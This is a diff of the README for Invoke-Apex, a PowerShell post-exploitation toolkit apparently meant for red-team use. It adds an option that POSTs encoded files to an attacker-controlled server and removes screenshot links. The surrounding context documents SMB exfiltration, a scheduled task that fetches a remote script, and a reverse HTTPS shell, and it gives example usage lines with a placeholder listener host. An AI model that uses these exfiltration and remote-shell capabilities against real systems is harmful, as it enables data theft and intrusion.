@@ -364,6 +364,8 @@ Allows for moving files off of a target system to a remote system.
 #### Available Commands:
 ```-SmbExfil``` (Copies a local file over SMB to a remote SMB Listener.)
 
+```-RestMethod``` (Uses PowerShell's "Invoke-RestMethod" "POST" to encode and send a file to an attacker-controlled web server.)
+
 ## Invoke-GlassWireExceptions
 Dumps any program exceptions configured in GlassWire Endpoint Protection software.
 
@@ -473,25 +475,6 @@ Usage: ```New-PsTask -PSUrl http://server/script.ps1 -TaskName "Test" -Time "00:
 Compiles a .NET (PowerShell) Reverse HTTPS Shell Executable. Currently only SSL listener is supported.
 
 Usage: ```New-Reverse -Lhost 192.168.1.1 -Lport 443```
-
-# Usage Examples
-
-### Invoke-Creds
-
-![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-Creds.png)
-
-### Invoke-DefenderTools
-
-![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-DefenderTools.png)
-
-### Invoke-Execute
-![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-Execute.png)
-
-### Invoke-MitreReference
-
-![screenshot](https://raw.githubusercontent.com/securemode/Invoke-Apex/master/Invoke-MitreReference.png)
-
-
 
 
 # DISCLAIMER
